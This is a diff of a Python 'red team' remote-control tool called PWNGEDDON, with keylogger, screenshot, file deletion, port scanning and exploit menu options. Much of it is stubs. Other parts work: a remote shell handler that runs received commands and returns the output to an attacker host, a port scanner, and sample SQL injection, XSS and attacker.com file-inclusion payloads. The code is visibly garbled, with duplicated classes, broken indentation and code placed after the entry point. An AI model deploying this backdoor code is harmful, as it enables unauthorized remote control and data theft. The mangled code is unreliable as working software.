+        | |_| | |_| | |_) | | \__ \ || (_) | |   
+        \____|\__,_|_.__/|_|_|___/\__\___/|_|   
+        """)
+
+        # Add startup message
+        print("Welcome to PWNGEDDON!\nInitializing...")
+
+        # Create an instance of RemoteControl
+        remote_control = RemoteControl()
 
         while True:
-            choice = input("Enter your choice: ")
+            # Call the display_menu method
+            remote_control.display_menu()
 
-            if choice == "1":
-                self.exploit_system()
-            elif choice == "2":
-                self.start_keylogger()
-            elif choice == "3":
-                self.stop_keylogger()
-            elif choice == "4":
-                self.screenshot()
-            elif choice == "5":
-                filename = input("Enter the filename to delete: ")
-                self.delete_file(filename)
-            elif choice == "6":
-                ip = input("Enter the IP to scan: ")
-                self.port_scan(ip)
-            elif choice == "7":
-                self.precheck()
-            elif choice == "8":
-                print("Exiting...")
-                sys.exit()
-            else:
-                print("Invalid choice. Please try again.")
+            # Prompt the user for their choice
+            try:
+                attack_choice = int(input("Enter your choice: "))
+                remote_control.execute_attack(attack_choice)
+            except ValueError:
+                print("Invalid choice. Please enter a number.")
 
-if __name__ == "__main__":
-    tool = RedTeamTool()
-    tool.run_tool()
+            self.logger.error(f"Decryption failed: {str(e)}")
 
-        if missing_tools or missing_packages:
-            logging.error("Pre-check failed. Missing dependencies:")
-            if missing_tools:
-                logging.error("Missing tools: " + ", ".join(missing_tools))
-            if missing_packages:
-                logging.error("Missing packages: " + ", ".join(missing_packages))
-            return False
+# Add startup message
+print("Welcome to Remote Control!")
+print("Initializing...")
 
-        logging.info("Pre-check passed. All dependencies are installed.")
-        return True
+# Create an instance of RemoteControl
+remote_control = RemoteControl()
 
-    def check_tool(self, tool):
-        try:
-            subprocess.check_output(["which", tool])
-            return True
-        except subprocess.CalledProcessError:
-            return False
+# Call the display_menu method
+remote_control.display_menu()
 
-    def check_package(self, package):
-        try:
-            subprocess.check_output(["dpkg", "-s", package])
-            return True
-        except subprocess.CalledProcessError:
-            return False
+print("Exiting...")
+import argparse
+import sys
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Remote Control CLI")
-    parser.add_argument("command", choices=["start_keylogger", "stop_keylogger", "screenshot", "delete_file", "exploit_system", "port_scan"], help="Command to execute")
-    parser.add_argument("--filename", help="Filename for delete_file command")
-    parser.add_argument("--ip", help="IP address for port_scan command")
-    args = parser.parse_args()
+parser = argparse.ArgumentParser(description="Remote Control CLI")
+parser.add_argument("command", choices=["start_keylogger", "stop_keylogger", "screenshot", "delete_file", "exploit_system", "port_scan"], help="Command to execute")
+parser.add_argument("--filename", help="Filename for delete_file command")
+parser.add_argument("--ip", help="IP address for port_scan command")
+args = parser.parse_args()
 
-    remote_control = RemoteControl()
+remote_control = RemoteControl()
 
-    if not remote_control.precheck():
-        exit(1)
+if not remote_control.precheck():
+    sys.exit(1)
 
-    if args.command == "start_keylogger":
-        remote_control.start_keylogger()
-    elif args.command == "stop_keylogger":
-        remote_control.stop_keylogger()
-    elif args.command == "screenshot":
-        remote_control.screenshot()
-    elif args.command == "exploit_system":
-        remote_control.exploit_system()
-    elif args.command == "port_scan":
-        remote_control.port_scan(args.ip)
-        remote_control.exploit_system()
-    elif args.command == "delete_file":
-        if args.filename:
-            remote_control.delete_file(args.filename)
-        else:
-            logging.error("Filename is required for delete_file command.")
-    elif args.command == "port_scan":
-        if args.ip:
-            remote_control.port_scan(args.ip)
-        else:
-            logging.error("IP address is required for port_scan command.")
+if args.command == "start_keylogger":
+    remote_control.start_keylogger()
+
+elif args.command == "stop_keylogger":
+    remote_control.stop_keylogger()
+elif args.command == "screenshot":
+    remote_control.screenshot()
+elif args.command == "exploit_system":
+    remote_control.exploit_system()
+elif args.command == "port_scan":
+    remote_control.port_scan(args.ip)
+    remote_control.exploit_system()
+elif args.command == "delete_file":
+    if args.filename:
+        remote_control.delete_file(args.filename)
     else:
-        logging.error("Invalid command.")
-
-            open_ports = []
-            for port in range(1, 1001):
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                    sock.settimeout(1)
-                    result = sock.connect_ex((ip, port))
-                    if result == 0:
-                        open_ports.append(port)
-
-            logging.info(f"Open ports on {ip}: {open_ports}")
-            self.scanned = True
-
-        except socket.error as e:
-            logging.error(f"Error: {str(e)}")
-
-    def persist(self):
-        logging.info("Persisting on the target system...")
-        # Implement techniques to ensure persistence on the target system
-        # Examples: creating a backdoor, modifying startup scripts, installing a rootkit, etc.
-        logging.info("Persistence established.")
-
-    def penetrate(self):
-        logging.info("Penetrating the target system...")
-        # Implement advanced techniques to gain unauthorized access to the target system
-        # Examples: exploiting zero-day vulnerabilities, using advanced social engineering techniques, etc.
-        logging.info("Target system penetrated.")
-
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-
-    def start_keylogger(self):
-        """Start the keylogger."""
-        logging.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        """Stop the keylogger."""
-        logging.info("Keylogger stopped.")
-
-    def screenshot(self):
-        """Capture a screenshot."""
-        logging.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        """Delete a file with the given filename.
-
-        Args:
-            filename (str): The name of the file to be deleted.
-        """
-        logging.info(f"File '{filename}' deleted.")
-
-    def exploit_system(self):
-        """Exploit the target system."""
-        logging.info("Exploiting the target system...")
-        
-        # Technique 1: Remote Code Execution
-        # Execute a command on the target system using a remote code execution vulnerability
-        command = "echo 'Exploited!' > /tmp/exploit.txt"
-        os.system(command)
-        logging.info("Command executed successfully.")
-        
-        # Technique 2: Buffer Overflow
-        # Overflow a buffer to execute arbitrary code on the target system
-        payload = b"A" * 1000  # Replace with your payload
-        # Send the payload to the target system using a vulnerable network service
-        
-        # Technique 3: SQL Injection
-        # Inject malicious SQL code to manipulate the target system's database
-        username = "admin' OR '1'='1'; --"
-        password = "password"
-        # Craft a SQL query that exploits the vulnerability and bypasses authentication
-        
-        # Technique 4: Remote File Inclusion
-        # Include a remote file to execute arbitrary code on the target system
-        remote_file = "http://attacker.com/malicious_payload.php"
-        # Craft a request to include the remote file in the target system's code
-        
-        # Technique 5: Privilege Escalation
-        # Exploit a vulnerability to elevate privileges on the target system
-        exploit_script = "/path/to/exploit_script.sh"
-        # Run the exploit script to gain higher privileges
-        
-        # Technique 6: Cross-Site Scripting (XSS)
-        # Inject malicious scripts into web pages viewed by users of the target system
-        script = "<script>alert('XSS Attack!');</script>"
-        # Craft a request or input that allows the script to be executed
-        
-        # Technique 7: Denial of Service (DoS)
-        # Overwhelm the target system with excessive requests or data to make it unavailable
-        # Use tools like LOIC (Low Orbit Ion Cannon) or hping3 to launch DoS attacks
-        
-        # Technique 8: Man-in-the-Middle (MitM) Attack
-        # Intercept and modify communication between the target system and other entities
-        # Use tools like Wireshark or Ettercap to perform MitM attacks
-        
-        # Customize the exploitation techniques based on your requirements
-        
-        logging.info("System exploited.")
-
-    def port_scan(self, ip):
-        """Scan for open ports on the specified IP address.
-
-        Args:
-            ip (str): The IP address to scan.
-        """
-        try:
-            open_ports = []
-            for port in range(1, 1001):
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                    sock.settimeout(1)
-                    result = sock.connect_ex((ip, port))
-                    if result == 0:
-                        open_ports.append(port)
-
-            logging.info(f"Open ports on {ip}: {open_ports}")
-            self.scanned = True  # Set the scanned flag to True
-
-        except socket.error as e:
-            logging.error(f"Error: {str(e)}")
-
-    def password_cracker(self, password_hash):
-        """Crack the given password hash.
-
-        Args:
-            password_hash (str): The password hash to crack.
-        """
-        logging.info(f"Password cracked: {password_hash}")
-
-    def network_sniffer(self):
-        """Start network sniffing."""
-        logging.info("Network sniffing started.")
-    """A class representing a remote control for executing commands on a target system."""
-
-    def __init__(self):
-        """Initialize the RemoteControl object."""
-        self.command_queue = queue.Queue()
-        self.connections = []
-        self.scanned = False  # Flag to indicate if the system has been scanned
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-
-    def start_keylogger(self):
-        """Start the keylogger."""
-        logging.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        """Stop the keylogger."""
-        logging.info("Keylogger stopped.")
-
-    def screenshot(self):
-        """Capture a screenshot."""
-        logging.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        """Delete a file with the given filename.
-
-        Args:
-            filename (str): The name of the file to be deleted.
-        """
-        logging.info(f"File '{filename}' deleted.")
-
-    import os
-    import socket
-    import logging
-    from cryptography.fernet import Fernet
+        logging.error("Filename is required for delete_file command.")
+else:
+    logging.error("Invalid command.")
     import queue
 
     class RemoteControl:
@@ -3128,16 +2729,18 @@ if __name__ == "__main__":
     remote_control = RemoteControl()
     remote_control.start()
 
-        # Implement file sending logic here
-        pass
+    # Implement file sending logic here
 
-    def receive_file(self, file_path, conn):
-        # Implement file receiving logic here
-        pass
+def receive_file(self, file_path, conn):
+    # Implement file receiving logic here
+    pass
 
-        except Exception as e:
-            # Send an error message back to the attacker
-            conn.send(f"Error: {str(e)}".encode())
+    try:
+        # Send an error message back to the attacker
+        conn.send(f"Error: {str(e)}".encode())
+    except Exception as e:
+        # Handle the exception and send an error message back to the attacker
+        conn.send(f"Error: {str(e)}".encode())
 
     def start_server(self):
         with ThreadPoolExecutor() as executor:
@@ -3211,8 +2814,8 @@ def main():
 
 if __name__ == "__main__":
     main()
-                    # Send an error message back to the attacker
-                    conn.send(f"File deletion failed: {str(e)}".encode())
+    # Send an error message back to the attacker
+    conn.send(f"File deletion failed: {str(e)}".encode())
 
     def start_server(self):
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -3224,83 +2827,159 @@ if __name__ == "__main__":
             conn, addr = server_socket.accept()
             self.logger.info(f"New connection from {addr[0]}:{addr[1]}")
 
-            with ThreadPoolExecutor() as executor:
-                executor.submit(self.handle_connection, conn)
+                        with ThreadPoolExecutor() as executor:
+                            executor.submit(self.handle_connection, conn)
 
-    def handle_connection(self, conn):
-        while True:
-            try:
-                data = conn.recv(4096)
-                if not data:
-                    break
-
-                decrypted_data = self.decrypt_data(data)
-                command = decrypted_data.strip()
-
-                self.handle_command(command, conn)
-            except Exception as e:
-                self.logger.error(f"Error handling connection: {str(e)}")
-                break
-
-        conn.close()
-
-            elif command.strip().lower().startswith("execute"):
-                try:
-                    # Get the command to execute
-                    command_to_execute = command.strip().split(" ", 1)[1]
-
-                    # Execute the command and get the output
-                    output = subprocess.check_output(command_to_execute, shell=True)
-
-                    # Encrypt the output
-                    encrypted_output = self.encrypt_data(output)
-
-                    # Send the encrypted output back to the attacker
-                    import os
-                    import shutil
-                    import threading
-                    from PIL import ImageGrab
-                    from concurrent.futures import ThreadPoolExecutor
-                    import keylogger
+                def handle_connection(self, conn):
                     import socket
-                    import logging
-                    import traceback
-                    from cryptography.fernet import Fernet
                     import subprocess
-                    import base64
-                    import random
-                    import string
-                    import time
-import subprocess
+                    from concurrent.futures import ThreadPoolExecutor
 
-                    # Define the attacker's IP address and port
-                    attacker_ip = "ATTACKER_IP"
-                    attacker_port = ATTACKER_PORT
+                    class RemoteControl:
+                        def __init__(self, attacker_ip, attacker_port):
+                            self.attacker_ip = attacker_ip
+                            self.attacker_port = attacker_port
+                            self.logger = Logger()  # Assuming you have a Logger class
 
-                    # Generate a random encryption key
-                    encryption_key = Fernet.generate_key()
-                    cipher_suite = Fernet(encryption_key)
+                        def handle_command(self, command, conn):
+                            # Implement your command handling logic here
+                            pass
 
-                    # Create a socket object
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-                    # Function to handle command execution
-                    def execute_command(command):
-                        try:
-                            # Check if the command is to exit the loop
-                            if command.strip().lower() == "exit":
-                                return
-
-                            # Check if the command is to start keylogging
-                            elif command.strip().lower() == "keylog":
-                                # Start the keylogger
-                                keylogger.start()
-
-                            # Check if the command is to capture a screenshot
-                            elif command.strip().lower() == "screenshot":
+                        def handle_connection(self, conn):
+                            while True:
                                 try:
-                                    # Capture the screenshot
-                                    screenshot = ImageGrab.grab()
+                                    data = conn.recv(4096)
+                                    if not data:
+                                        break
+
+                                    decrypted_data = self.decrypt_data(data)
+                                    command = decrypted_data.strip()
+
+                                    self.handle_command(command, conn)
+                                except Exception as e:
+                                    self.logger.error(f"Error handling connection: {str(e)}")
+                                    break
+
+                            conn.close()
+
+                        def start_server(self):
+                            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            server_socket.bind((self.attacker_ip, self.attacker_port))
+                            server_socket.listen(5)
+                            self.logger.info(f"Server started on {self.attacker_ip}:{self.attacker_port}")
+
+                            while True:
+                                conn, addr = server_socket.accept()
+                                self.logger.info(f"New connection from {addr[0]}:{addr[1]}")
+
+                                with ThreadPoolExecutor() as executor:
+                                    executor.submit(self.handle_connection, conn)
+
+                        def encrypt_data(self, data):
+                            # Implement your encryption logic here
+                            pass
+
+                        def decrypt_data(self, data):
+                            # Implement your decryption logic here
+                            pass
+
+                    class Logger:
+                        def info(self, message):
+                            # Implement your logging logic here
+                            pass
+
+                        def error(self, message):
+                            # Implement your error logging logic here
+                            pass
+
+                    def main():
+                        attacker_ip = "127.0.0.1"
+                        attacker_port = 1234
+
+                        remote_control = RemoteControl(attacker_ip, attacker_port)
+                        remote_control.start_server()
+
+                    if __name__ == "__main__":
+                        main()
+
+                    elif command.strip().lower().startswith("execute"):
+                        try:
+                            # Get the command to execute
+                            command_to_execute = command.strip().split(" ", 1)[1]
+
+                            # Execute the command and get the output
+                            output = subprocess.check_output(command_to_execute, shell=True)
+
+                            # Encrypt the output
+                            encrypted_output = self.encrypt_data(output)
+
+                            # Send the encrypted output back to the attacker
+                            # ...
+                            # (import statements and other code related to sending the output)
+                            # ...
+                        except Exception as e:
+                            self.logger.error(f"Error executing command: {str(e)}")
+                        try:
+                            # Get the command to execute
+                            command_to_execute = command.strip().split(" ", 1)[1]
+
+                            # Execute the command and get the output
+                            output = subprocess.check_output(command_to_execute, shell=True)
+
+                            # Encrypt the output
+                            encrypted_output = self.encrypt_data(output)
+
+                            # Send the encrypted output back to the attacker
+                            # ...
+                            # (import statements and other code related to sending the output)
+                            # ...
+                        except Exception as e:
+                            self.logger.error(f"Error executing command: {str(e)}")
+
+            import subprocess
+
+            # Define the attacker's IP address and port
+            attacker_ip = "YOUR_ATTACKER_IP"
+            attacker_port = YOUR_ATTACKER_PORT
+
+            # Generate a random encryption key
+            encryption_key = Fernet.generate_key()
+            cipher_suite = Fernet(encryption_key)
+
+            # Create a socket object
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            # Function to handle command execution
+            def execute_command(command):
+                try:
+                    # Check if the command is to exit the loop
+                    if command.strip().lower() == "exit":
+                        return
+
+                    # Check if the command is to start keylogging
+                    elif command.strip().lower() == "keylog":
+                        # Start the keylogger
+                        keylogger.start()
+
+                    # Check if the command is to capture a screenshot
+                    elif command.strip().lower() == "screenshot":
+                        try:
+                            # Capture the screenshot
+                            screenshot = ImageGrab.grab()
+
+                            # Save the screenshot as a file
+                            screenshot.save("screenshot.png")
+
+                            # Check if the file exists
+                            if os.path.exists("screenshot.png"):
+                                # Open the file in binary mode
+                                with open("screenshot.png", "rb") as file:
+                                    # Read the file contents
+                                    file_contents = file.read()
+                        except Exception as e:
+                            self.logger.error(f"Error executing command: {str(e)}")
+                except Exception as e:
+                    self.logger.error(f"Error executing command: {str(e)}")
 
                                     # Save the screenshot as a file
                                     screenshot.save("screenshot.png")
@@ -3353,14 +3032,19 @@ import subprocess
                                         "chmod",
                                         "Linpeas",
                                         # Add more requirements here
+                                    ]  # Close the square bracket here
 
-                                    def dirbust(target_url):
-                                        try:
-                                            # Execute DirBuster command and capture the output
-                                            output = subprocess.run(["dirbuster", "-u", target_url], capture_output=True, text=True).stdout
+                                def dirbust(target_url):
+                                    try:
+                                        # Execute DirBuster command and capture the output
+                                        output = subprocess.run(["dirbuster", "-u", target_url], capture_output=True, text=True).stdout
 
-                                            # Send the output back to the attacker
-                                            s.send(base64.b64encode(output.encode()))
-                                        except Exception as e:
-                                            # Send an error message back to the attacker
-                                            s.send(base64.b64encode(str(e).encode()))
+                                        # Send the output back to the attacker
+                                        s.send(base64.b64encode(output.encode()))
+                                    except Exception as e:
+                                        # Send an error message back to the attacker
+                                        s.send(base64.b64encode(str(e).encode()))
+
+                                # Close the check_requirements function here
+                                check_requirements()
+
